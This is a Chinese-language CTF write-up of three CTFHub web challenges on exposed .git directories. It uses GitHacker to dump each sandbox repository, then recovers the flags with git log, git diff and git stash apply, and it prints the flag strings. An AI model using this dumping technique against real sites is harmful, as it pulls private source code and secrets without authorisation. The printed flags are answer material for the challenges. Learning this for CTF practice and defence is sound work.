---
title: Web - Git 泄露
description: CTFHub | 技能树 | Web
---

## 题目

当前大量开发人员使用 git 进行版本控制，对站点自动部署。如果配置不当,可能会将 .git 文件夹直接部署到线上环境。这就引起了 git 泄露漏洞。

## Log

### 解题思路

- 使用工具 [WangYihang/GitHacker](https://github.com/WangYihang/GitHacker) 检出 Git 仓库
    ```bash
    $ githacker --url http://challenge-6c68a91f29757be4.sandbox.ctfhub.com:10080/.git/ --folder result
    ```
- 进入检出目录，查看日志信息，当前位于`flag`已经删除的版本
    ```bash
    $ git log
    commit 331d0cdbf0d55ada0ee114851b846705bf19fd99 (HEAD -> master)
    Author: CTFHub <sandbox@ctfhub.com>
    Date:   Thu May 27 06:27:19 2021 +0000

        remove flag

    commit 3db6be0b17e9d3141cfee4d7593d0d1a56bc1e82
    Author: CTFHub <sandbox@ctfhub.com>
    Date:   Thu May 27 06:27:19 2021 +0000

        add flag

    commit 3891bbce49688c80cd02d6bc91953055d249c697
    Author: CTFHub <sandbox@ctfhub.com>
    Date:   Thu May 27 06:27:19 2021 +0000

        init
    ```
- 与`add flag`版本进行比较，差异信息即为 Flag
    ```bash
    $ git diff 3db6be0b17e9d3141cfee4d7593d0d1a56bc1e82
    diff --git a/1380320821329.txt b/1380320821329.txt
    deleted file mode 100644
    index 7bbea29..0000000
    --- a/1380320821329.txt
    +++ /dev/null
    @@ -1 +0,0 @@
    -ctfhub{9b8fffa8e969d3950e8e98ba}
    ```

## Stash

### 解题思路

- 同样地，检出仓库并进入仓库目录
    ```bash
    $ githacker --url http://challenge-942122132ef0c89f.sandbox.ctfhub.com:10080/.git --folder result
    $ cd result/
    ```
- `git stash` 保存本地未提交的修改，并将工作目录恢复到当前 `HEAD` commit 的版本，便于在当前分支修改未提交的情况下切换分支
- 使用 `git stash apply` 恢复，即可获得 Flag 文件
    ```bash
    $ ls
    50x.html  index.html
    $ git stash apply
    冲突（修改/删除）：291731707232651.txt 在 Updated upstream 中被删除，在 Stashed changes 中被 修改。291731707232651.txt 的 Stashed changes 版本被保留。
    $ ls
    291731707232651.txt  50x.html  index.html
    $ cat 291731707232651.txt 
    ctfhub{bb407b064154f284de35ad5c}
    ```

## Index

### 解题思路

- `GitHacker`检出目录后就看到 Flag 文件了（咦 :0）
    ```bash
    $ githacker --url http://challenge-4c0f5006f79ca499.sandbox.ctfhub.com:10080/.git --folder result
    $ cd result/
    $ ls
    2084027691726.txt  50x.html  index.html
    $ cat 2084027691726.txt 
    ctfhub{c4bdf1723804493c9d8d61b3}
    ```
- Git index 作为工作目录和仓库之间的暂存区域，可存储一组修改一并提交